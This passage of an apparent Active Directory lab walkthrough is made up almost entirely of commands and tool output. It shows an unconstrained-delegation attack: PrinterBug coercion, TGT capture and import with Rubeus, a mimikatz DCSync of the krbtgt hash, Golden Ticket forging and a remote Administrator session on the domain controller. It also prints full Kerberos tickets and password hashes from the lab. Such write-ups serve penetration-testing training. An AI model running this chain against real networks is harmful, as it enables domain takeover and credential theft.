[*] Target user     : DCORP-DC$
[*] Monitoring every 10 seconds for new TGTs
```

- Coerce authentication to `DCORP-APPSRV` from `DCORP-DC` using `PrinterBug`
```
PS C:\AD\MyTools> .\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

- Capture the incoming TGT.
```
<snip>

[*] 8/8/2023 8:19:15 PM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
  StartTime             :  8/8/2023 10:15:08 AM
  EndTime               :  8/8/2023 8:15:08 PM
  RenewTill             :  8/15/2023 12:42:16 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 1
```

- Use the extracted ticket to extract credentials from the DC (accessing the target remotely will not work because machines do not get remote local admin access to themselves).
```
[DCORP-APPSRV]: PS C:\Windows\Tasks> .\Rubeus.exe ptt /ticket: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

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3


[*] Action: Import Ticket
[+] Ticket successfully imported!
[DCORP-APPSRV]: PS C:\Windows\Tasks> klist

Current LogonId is 0:0x553a53

Cached Tickets: (1)

#0>     Client: DCORP-DC$ @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 8/8/2023 10:15:08 (local)
        End Time:   8/8/2023 20:15:08 (local)
        Renew Time: 8/15/2023 0:42:16 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

PS C:\AD\MyTools> .\mimikatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837
```

- Forge a Golden Ticket to get Remote Access to the DC.
```
PS C:\Windows\Tasks> .\Rubeus.exe golden /rc4:4e9815869d2090ccfca61c1fe0d23986 /user:Administrator /ptt /domain:dollarcorp.moneycorp.local /ldap /domain:dollarcorp.moneycorp.local /dc:172.16.2.1 /sid:S-1-5-21-719815819-3726368948-3917688648

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Build TGT

[*] Trying to query LDAP using LDAPS for user information on domain controller 172.16.2.1
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
[*] Retrieving group and domain policy information over LDAP from domain controller 172.16.2.1
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\172.16.2.1\SYSVOL
[X] Error mounting \\172.16.2.1\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully mounted
[*] Attempting to unmount: \\us.dollarcorp.moneycorp.local\SYSVOL
[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully unmounted
[*] Retrieving netbios name information over LDAP from domain controller 172.16.2.1
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Retrieving group information over LDAP from domain controller 172.16.2.1
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513))'
[*] Retrieving netbios name information over LDAP from domain controller 172.16.2.1
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Building PAC
[X] Error resolving IP address '172.16.2.1' to a name: This is usually a temporary error during hostname resolution and means that the local server did not receive a response from an authoritative server

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 4E9815869D2090CCFCA61C1FE0D23986
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 4E9815869D2090CCFCA61C1FE0D23986
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'

[*] AuthTime       : 8/20/2023 7:32:08 AM
[*] StartTime      : 8/20/2023 7:32:08 AM
[*] EndTime        : 8/20/2023 5:32:08 PM
[*] RenewTill      : 8/27/2023 7:32:08 AM

[*] base64(ticket.kirbi):

      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


[+] Ticket successfully imported!
PS C:\Windows\Tasks> Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\Administrator\Documents> hostname
dcorp-dc
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\Administrator\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```